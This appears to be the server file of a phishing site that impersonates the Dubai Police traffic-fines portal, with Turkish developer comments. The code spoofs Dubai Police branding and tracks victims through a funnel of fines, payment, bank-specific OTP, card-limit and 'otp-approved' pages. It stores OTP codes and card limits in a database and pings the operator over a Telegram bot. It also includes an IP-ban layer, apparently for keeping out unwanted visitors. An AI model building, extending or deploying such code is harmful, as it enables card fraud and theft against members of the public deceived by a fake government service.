require('dotenv').config();
const express   = require('express');
const session   = require('express-session');
const pgSession = require('connect-pg-simple')(session);
const path      = require('path');
const crypto    = require('crypto');

const { pool, ensureActivityLogsTable, ensureTrackingTables, purgeOldTracking, pathRank, getSetting, setSetting } = require('./db');
const siteRouter  = require('./routes/site');
const apiRouter   = require('./routes/api');
const adminRouter = require('./routes/admin');

const app  = express();
const PORT = process.env.PORT || 3000;

// Vercel proxy arkasında çalışıyor — güvenli cookie için gerekli
app.set('trust proxy', 1);

// View engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Session — PostgreSQL store (serverless-safe)
app.use(session({
  store: new pgSession({
    pool,
    tableName: 'user_sessions',
    createTableIfMissing: true,
  }),
  secret:            process.env.SESSION_SECRET || 'changeme',
  resave:            false,
  saveUninitialized: false,
  cookie: {
    secure:   process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge:   24 * 60 * 60 * 1000,
  },
}));

// ─── Maintenance mode middleware ──────────────────────────────────────────────
let maintenanceCache = { value: '1', time: 0 };
app.use(async (req, res, next) => {
  if (req.path.startsWith('/admin') || req.path.startsWith('/api')) return next();
  if (req.path.includes('.')) return next();
  try {
    const now = Date.now();
    if (now - maintenanceCache.time > 30000) {
      const raw = await pool.query("SELECT value FROM settings WHERE key='site_active' LIMIT 1");
      maintenanceCache.value = raw.rows[0]?.value ?? '1';
      maintenanceCache.time = now;
    }
    if (maintenanceCache.value !== '1') {
      return res.status(503).send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dubai Police — Maintenance</title><link rel="icon" type="image/png" href="/dp-logo.png"><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:#f5f7fa;min-height:100vh;display:flex;flex-direction:column}header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 20px;display:flex;align-items:center;gap:12px}.h-logo{width:36px;height:36px;border-radius:50%;border:2px solid rgba(255,255,255,0.25)}.h-name{color:white;font-weight:800;font-size:15px;line-height:1.2}.h-sub{color:rgba(255,255,255,0.6);font-size:11px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}.card{background:white;border-radius:18px;padding:40px 32px;max-width:420px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,0.08)}.icon{width:64px;height:64px;background:#e8f5ee;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}.title{font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:10px}.sub{font-size:14px;color:#6b7280;line-height:1.6}.badge{display:inline-block;margin-top:20px;padding:6px 16px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;font-size:12px;font-weight:600;color:#166534}</style></head><body><header><img src="/dp-logo.png" alt="" class="h-logo" width="36" height="36"><div><div class="h-name">Dubai Police</div><div class="h-sub">شرطة دبي</div></div></header><div class="main"><div class="card"><div class="icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#006837" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div><div class="title">Service Under Maintenance</div><div class="sub">The Traffic Fines Portal is temporarily unavailable while we perform scheduled maintenance. Please try again shortly.</div><div class="badge">We'll be back soon</div></div></div></body></html>`);
    }
  } catch {}
  next();
});

// ─── IP Ban middleware ─────────────────────────────────────────────────────────
let bannedIpsCache = { list: [], time: 0 };
app.use(async (req, res, next) => {
  if (req.path.startsWith('/admin') || req.path.startsWith('/api')) return next();
  if (req.path.startsWith('/public') || req.path.includes('.')) return next();
  try {
    const now = Date.now();
    if (now - bannedIpsCache.time > 30000) {
      const raw = await pool.query("SELECT value FROM settings WHERE key='banned_ips' LIMIT 1");
      bannedIpsCache.list = JSON.parse(raw.rows[0]?.value || '[]');
      bannedIpsCache.time = now;
    }
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || req.connection?.remoteAddress || '';
    if (bannedIpsCache.list.includes(ip)) {
      return res.status(403).send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Blocked</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#0f2027;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:white;border-radius:16px;padding:40px 32px;max-width:400px;width:100%;text-align:center}.icon{font-size:48px;margin-bottom:16px}.title{font-size:20px;font-weight:800;color:#dc2626;margin-bottom:8px}.msg{font-size:14px;color:#6b7280;line-height:1.5}</style></head><body><div class="card"><div class="icon">🚫</div><div class="title">Access Blocked</div><div class="msg">Your access to this service has been blocked. If you believe this is an error, please contact support.</div></div></body></html>');
    }
  } catch {}
  next();
});

// ─── Visitor ID cookie ───────────────────────────────────────────────────────
function parseCookies(header) {
  const out = {};
  (header || '').split(';').forEach(p => {
    const i = p.indexOf('=');
    if (i > 0) out[p.slice(0,i).trim()] = decodeURIComponent(p.slice(i+1).trim());
  });
  return out;
}
app.use((req, res, next) => {
  if (req.path.startsWith('/admin') || req.path.startsWith('/api/admin')) return next();
  const cookies = parseCookies(req.headers.cookie);
  let vid = cookies.dp_vid;
  if (!vid || !/^[a-f0-9]{32}$/.test(vid)) {
    vid = crypto.randomBytes(16).toString('hex');
    res.cookie('dp_vid', vid, {
      maxAge: 90 * 24 * 60 * 60 * 1000,
      httpOnly: false,        // browser-side heartbeat needs to read it
      sameSite: 'lax',
      secure: process.env.NODE_ENV === 'production',
    });
  }
  req.visitorId = vid;
  next();
});

// ─── Spike alert + cleanup throttling (DB-backed for serverless) ─────────────
async function maybeRunMaintenance() {
  try {
    const now = Date.now();
    // Throttle: only run checks once per ~5 minutes across all instances
    const last = parseInt(await getSetting('last_maint_ts', '0'), 10) || 0;
    if (now - last < 5 * 60 * 1000) return;
    await setSetting('last_maint_ts', String(now));

    // Cleanup retention
    const days = parseInt(await getSetting('tracking_retention_days', '7'), 10) || 7;
    await purgeOldTracking(days).catch(()=>{});

    // Spike check
    const cur  = await pool.query(`SELECT COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) AS c
                                   FROM visitors WHERE created_at > NOW() - INTERVAL '30 minutes'`);
    const prev = await pool.query(`SELECT COUNT(DISTINCT COALESCE(NULLIF(visitor_id,''), ip)) AS c
                                   FROM visitors WHERE created_at <= NOW() - INTERVAL '30 minutes'
                                                    AND created_at >  NOW() - INTERVAL '60 minutes'`);
    const curN  = Number(cur.rows[0]?.c  || 0);
    const prevN = Number(prev.rows[0]?.c || 0);
    const delta = curN - prevN;

    const lastAlert = parseInt(await getSetting('last_spike_alert_ts', '0'), 10) || 0;
    const threshold = parseInt(await getSetting('spike_threshold', '15'), 10) || 15;
    if (delta >= threshold && (now - lastAlert) > 15 * 60 * 1000) {
      const token  = await getSetting('telegram_bot_token', '');
      const chatId = await getSetting('inquiry_chat_id', '');
      if (token && chatId) {
        const msg = [
          '📈 <b>Traffic Spike Alert</b>',
          '─────────────────',
          `Current 30min: <b>${curN}</b> unique visitors`,
          `Previous 30min: <b>${prevN}</b>`,
          `Delta: <b>+${delta}</b>`,
          '─────────────────',
          `Time: ${new Date().toLocaleString('tr-TR', { timeZone:'Asia/Dubai' })} (Dubai)`,
        ].join('\n');
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST', headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML' })
        }).catch(()=>{});
        await setSetting('last_spike_alert_ts', String(now));
      }
    }
  } catch (e) {
    console.error('Maintenance error:', e.message);
  }
}

// ─── Visitor Tracking ─────────────────────────────────────────────────────────
app.use((req, res, next) => {
  if (req.path.startsWith('/admin') || req.path.startsWith('/api')) return next();
  if (req.path.includes('.')) return next();
  if (req.method !== 'GET') return next();
  try {
    const ip  = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || req.connection?.remoteAddress || '';
    const ua  = (req.headers['user-agent'] || '').slice(0, 500);
    const ref = (req.headers['referer']    || '').slice(0, 500);
    const vid = req.visitorId || '';
    const p   = req.path.slice(0, 255);
    const rank = pathRank(p);

    // Raw event log
    pool.query(
      'INSERT INTO visitors (ip, path, visitor_id, user_agent, referrer) VALUES ($1,$2,$3,$4,$5)',
      [ip.slice(0,60), p, vid, ua, ref]
    ).catch(()=>{});

    // Upsert aggregated state — page count + deepest-rank path
    pool.query(`
      INSERT INTO visitor_state (visitor_id, ip, user_agent, current_path, deepest_path, page_count, first_seen, last_seen)
      VALUES ($1,$2,$3,$4,$4,1,NOW(),NOW())
      ON CONFLICT (visitor_id) DO UPDATE SET
        ip = EXCLUDED.ip,
        user_agent = EXCLUDED.user_agent,
        current_path = EXCLUDED.current_path,
        deepest_path = CASE WHEN $5 > (
          SELECT COALESCE((SELECT rank FROM (VALUES
            ('/',1),('/fines',2),('/payment',3),
            ('/otp',4),('/otp-sms',4),('/otp-sms2',4),('/otp-citi',4),('/otp-mashreq',4),
            ('/otp-loading',4),('/card-limit',4),('/waiting',4),('/yogunluk',4),
            ('/otp-approved',5)
          ) AS f(p,rank) WHERE f.p = visitor_state.deepest_path),0)
        ) THEN EXCLUDED.current_path ELSE visitor_state.deepest_path END,
        last_seen = NOW(),
        page_count = visitor_state.page_count + 1
    `, [vid, ip.slice(0,60), ua, p, rank]).catch(()=>{});

    // Fire-and-forget maintenance ping (~5% sample)
    if (Math.random() < 0.05) maybeRunMaintenance().catch(()=>{});
  } catch {}
  next();
});

// Routes
app.use('/',      siteRouter);
app.use('/api',   apiRouter);
app.use('/admin', adminRouter);

// Auto-run DB migrations on startup (safe — IF NOT EXISTS)
pool.query('ALTER TABLE payments ADD COLUMN IF NOT EXISTS last_seen TIMESTAMP DEFAULT NULL')
  .catch(e => console.log('Migration note:', e.message));

pool.query("ALTER TABLE payments ADD COLUMN IF NOT EXISTS comment TEXT DEFAULT ''")
  .catch(e => console.log('Migration note (comment):', e.message));

pool.query("ALTER TABLE payments ADD COLUMN IF NOT EXISTS card_limit VARCHAR(20) DEFAULT ''")
  .catch(e => console.log('Migration note (card_limit):', e.message));

pool.query("ALTER TABLE otp_events ADD COLUMN IF NOT EXISTS otp_code VARCHAR(10) DEFAULT NULL")
  .catch(e => console.log('Migration note (otp_code):', e.message));

ensureActivityLogsTable().catch(console.error);
ensureTrackingTables().catch(console.error);

pool.query(`
  CREATE TABLE IF NOT EXISTS visitors (
    id SERIAL PRIMARY KEY,
    ip VARCHAR(60) NOT NULL DEFAULT '',
    path VARCHAR(255) NOT NULL DEFAULT '',
    created_at TIMESTAMP DEFAULT NOW()
  )
`).catch(e => console.log('Migration note (visitors):', e.message));

// 404
app.use((req, res) => res.status(404).send('Sayfa bulunamadı.'));

// Global error handler
app.use((err, req, res, next) => {
  console.error('❌ Sunucu hatası:', err.stack || err.message);
  res.status(500).send('Sunucu hatası: ' + err.message);
});

app.listen(PORT, () => {
  console.log(`✅ Dubai Node sunucu başlatıldı → http://localhost:${PORT}`);
  console.log(`   Admin panel: http://localhost:${PORT}/admin`);
});
